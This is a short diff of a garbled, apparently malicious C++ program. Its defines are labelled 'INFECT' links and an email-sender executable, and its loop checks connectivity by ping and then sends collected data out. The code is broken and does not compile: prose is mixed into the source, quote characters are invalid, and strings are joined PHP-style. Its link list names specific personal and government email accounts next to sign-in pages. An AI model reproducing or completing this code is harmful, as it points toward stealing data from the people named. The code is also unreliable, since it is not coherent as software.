@@ -20,7 +20,7 @@ using namespace std;
 
 And the owner of the administrative number, namely West Java, reported using coding techniques.”
 #define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/FadliwiryaWirawan110993/forks"."https://gitlab.com/cyberw1ry4/forks"."https://github.com/google/opensource/blokier-mail/forks"
-#define INFECT_Link_NAME "www.youtube.com/@NabilaTaqiyyah"."https://workspace.google.com/intl/en-my/gmail/"."https://accounts.google.com/v3/signin/identifier?usahasertifikasilestari@gmail.com"."https://accounts.google.com/v3/signin/identifier?sutajayanisa@gmail.com"."https://accounts.google.com/v3/signin/identifier?humas@bssn.go.ig"."https://icloud.com/mail/id"."https://www.apple.co.id"
+#define INFECT_Link_NAME "https://bughunters.google.com/"."www.youtube.com/@NabilaTaqiyyah"."https://workspace.google.com/intl/en-my/gmail/"."https://accounts.google.com/v3/signin/identifier?usahasertifikasilestari@gmail.com"."https://accounts.google.com/v3/signin/identifier?sutajayanisa@gmail.com"."https://accounts.google.com/v3/signin/identifier?humas@bssn.go.ig"."https://icloud.com/mail/id"."https://www.apple.co.id"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.google.co.id -n 1")){ ///check! connection
+            if(!system("ping  www.bughunters.google.com -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
